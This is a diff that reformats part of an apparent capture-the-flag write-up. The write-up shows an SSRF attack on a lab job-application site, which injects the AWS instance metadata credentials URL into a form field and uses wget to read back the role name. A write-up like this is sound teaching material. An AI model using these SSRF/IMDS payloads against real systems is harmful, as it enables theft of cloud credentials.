@@ -65,24 +65,26 @@ Let's head to the Frost Tower website and see what we're facing:
 
 Clicking `Apply Now` leads us to an application page with some standard fields, and interestingly, a field to collect a
 web accessible `NLBI` (Naughty List Background Investigation) report. Recalling our hint from Noxious, this seems like a
-good place to try out some SSRF/IMDS attacks.  We can fill out some fake details, and in the `NLBI` field, place:
+good place to try out some SSRF/IMDS attacks. We can fill out some fake details, and in the `NLBI` field, place:
 
 ```
 http://169.254.169.254/latest/meta-data/iam/security-credentials
 ```
 
-If the server uses this URL to fetch data, we may be able to retrieve metadata about the underlying AWS infrastructure.  Once we hit submit, we get the following acceptance page:
+If the server uses this URL to fetch data, we may be able to retrieve metadata about the underlying AWS infrastructure.
+Once we hit submit, we get the following acceptance page:
 
 ![Submission Accepted](Submission.png)
 
-Interestingly, there seems to be a broken image being presented.  Let's grab that using wget and inspect the contents:
+Interestingly, there seems to be a broken image being presented. Let's grab that using wget and inspect the contents:
 
 ```bash
 $ wget https://apply.jackfrosttower.com/images/test.jpg 2>/dev/null && cat test.jpg; echo
 jf-deploy-role
 ```
 
-So it seems like we have validated an SSRF attack vector which leverages IMDS.  Let's submit another application with the folloing URL:
+So it seems like we have validated an SSRF attack vector which leverages IMDS. Let's submit another application with the
+folloing URL:
 
 ```
 http://169.254.169.254/latest/meta-data/iam/security-credentials/jf-deploy-role
